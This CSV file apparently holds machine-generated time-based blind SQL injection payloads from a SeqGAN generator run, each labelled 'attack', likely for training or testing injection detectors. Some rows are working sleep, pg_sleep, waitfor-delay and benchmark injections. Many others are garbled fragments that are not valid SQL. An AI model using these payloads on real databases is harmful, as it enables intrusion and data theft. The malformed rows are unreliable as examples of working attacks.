label,payload,family,payload_type,method,run_id,sample_index
attack,"1%%""  )   rlike sleep  (  5  )   and   (  ""%""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  """"  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1204
attack,"1%""  )   rlike sleep  (  5  )   and   (  "" '  '  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1205
attack,$  )    )   or   )    =    )    )    )    #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1206
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1207
attack,1'  )   'isintegratedsecurityonly'waitfor delay '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1208
attack,"1'  )    )    )    or sleep  =  3114,sleep  (  0x76555642  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1209
attack,1'  )   )    )    or pg_sleep  (  substringsleep  (  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1210
attack,1  )    )    or sleep  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1211
attack,; or 4240 from 8594    (    (    (  5000000(  pg_sleep  (  sleep  (  5   )    )    )    )    )    )    )    =  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1212
attack,1%'wcadocdo where 8036 from 8036  =    __TIME____  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1213
attack,or' 8514 sleep  (  __TIME__  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1214
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  )   rlike sleep  (  5  )   and   (  ""%%' waitfor delay '0'sa'0x694a4745:"" like "".uas ko"" like ""jselect 5466 from  =   sleep  (  __TIME_____TIME__  )       )   sleep  (  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1215
attack,"1%""    )    )    )    orpg_sleep  (  5  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1216
attack,"select * benchmark  (  ___TIME_______TIME___(  ___TIMDE__  ),sleep  (  )    )    )    =   _____TIME_____TIME__  TIME__  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1217
attack,", or 8514 from",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1218
attack,", r benchmark  (  5000000,md5  ,,1  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1219
attack,c where =  5   )    )    )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1220
attack,1    )    )    end,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1221
attack,   )    )    )    )    )    or 4240    (  5   )    )    )    )    #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1222
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1223
attack,", from dh where 1361  =  6784sleep  (  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1224
attack,"""  )     )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1225
attack,1 or 6969  =    (    select benchmark  (  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1226
attack,"1%""   )    )    )    or sleep  =  5   )    )    )    as edddonand e sleep  (  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1227
attack,1' where 6784)  )    )    )    =    __TIMD5  (  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1228
attack,1%'   )    )    )    or sleep 50  sleep  (  5  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1229
attack,1 where 6784=  6784 elt  =  'isintegratedsecurityonly'   )    )    --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1230
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1231
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%%""    )    )    )    or 8514  =   benchmark  (  5  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1232
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%$'  =  '%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1233
attack,"; a, ifd x where from 2388  7260  =  '  )    =  '  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1234
attack,$  )   and 6793 8514 sleep  (  5  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1235
attack,"1%""  )   )    )    or sleep  =  sleep  )  sleep  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1236
attack,"1%'   )    )    )    or pg_sleep  (  ____TIME_____TIME__)  substring   (    select * sleep  (  3114,  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1237
attack,; if not  (  (  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1238
attack,"1%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1239
attack,", if not  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1240
attack,", (  1 where =  select and elt  (  3114,sleep  (  __TIME______TIME______TIME________TIME____TIMd5  (  10000000,ME____  )--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1241
attack,5873 and    *esleep  (  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1242
attack,"1'  )waitforor benchmark  (  6272,sleep  (  5   )    )    )    )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1243
attack,"1%wcbfq""   )    )    or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1244
attack,1%'   )    )    )    or benchmark  (  5   )    )    )   waitfor * delay --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1245
attack,f or sleep  (  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1246
attack,"1""   )    )    ) 4240 delay from --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1247
attack, 6784 or delay 9443* from   (  5   )    )    )    )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1248
attack,6866,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1249
attack,"1% f' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1250
attack,""" or sleep  (  10000000,ME_____  ___TIME__  ),--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1251
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  ""'   )    )    or""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "" 4240  =  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1252
attack,"1%'   )    )    rlike sleep  (  5  )   and    (    (   'c  )<>ct""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""do,no not  (  5   )    )    )    )    50)    )'||  (  select 'then'  )    or from   (    (    select 0(   select @versezopdo",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1253
attack,"""   )    )    or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1254
attack,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""c where 6784  =  5466 and *  (  select 2388  =    (    __TIME______TIME______TIME_____TI,MDE  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1255
attack,"1%%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1256
attack,"1""   )    )    )    or 2388  =    (  select 4240 from 4240  =    _TIME____TIME_____TIME____TIME_______TIME______TIME_______TIME____TIME___  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1257
attack,sleep  )    )    )    )--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1258
attack,"1%wc' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1259
attack,"1%wf%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1260
attack,; or sleep  (  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1261
attack,1%'  )   ;waitfor delay '0:0:2' from 4240 --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1262
attack,"1"" or 4240 from sleep  (  5  )  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1263
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%where'   )    )    rlike sleep  (  5  )   and    (    (   '""  =  ""bfk25elseq",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1264
attack,"1%""  )   rlike sleep  (  5  )   and   (  """"  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""c dn 0le1 where 9862  =  sleep  )  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1265
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""'   )    )    rlike sleep  (  5  )   and    (    (   '"" or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1266
attack,"1%""   )    )    or benchmark  (   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1267
attack,1'    )    )    )    )    )    )    )    )    or pg_sleep  (  5   )    )    )    )    )    )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1268
attack,1 where 6784  =  ' sleep  (  __TIME____  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1269
attack,""" or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1270
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""c n",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1271
attack," ,o  )    )    )    )    )    asperoo or sleep  (  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1272
attack, 9443 sleep  (  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1273
attack,1 vcq sleep  (  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1274
attack,1%'   )    )    )    or 4240  =    (  select ) from   (    =    (   select @@vers   )    )    )    or pg_sleep  (  sleep  (  5   )    )    )    )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1275
attack,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""cnone0)    )    )    =    (   select 8=    _select   )    )    )    #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1276
attack,1=%'  )    s,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1277
attack,1 or pg_sleep  (  (  5   )   )    )    )    )    )    )    )    or pg_sleep  (  9443  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1278
attack,"%"")   or 6793 from pg_sleep  (  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1279
attack,doc where 6784  =  ' when   =    (  __TIME______TIME___  )    )--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1280
attack,;waitfor and sleep  (  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1281
attack,1'  'sysadmin'   )    )    )    or pg_sleep  =  ___TIME_____TIME_____TIME_____TIME_______T't_TIME______TIME_____TIME_____TIME____  )    )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1282
attack,1 where =  3885 --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1283
attack,1%'   )    )    )    )    or benchmark  (  __)    )    )    =    )    5000000--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1284
attack,"1   )    )    )    <> 1  )    )    )    or benchmark  (  5000000,md5  (  from   )    (    )    )    )    )    )    1    )    #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1285
attack,"1 if and *  (  sleep  (  5000000,)  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1286
attack," ,1  )    )    )    or sleep  (  5   )    )    )%--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1287
attack,"1"" where 6784 8036  =  '  =  'sleep  (  __TIMDE___  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1288
attack,or 8514(  6866   (    )    )    )    )    )    )    )    0)    )    )    )    )    and,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1289
attack,"""   )    )    )    )    )    and    benchmark  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1290
attack,; or 4240  =    __TIME____  )--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1291
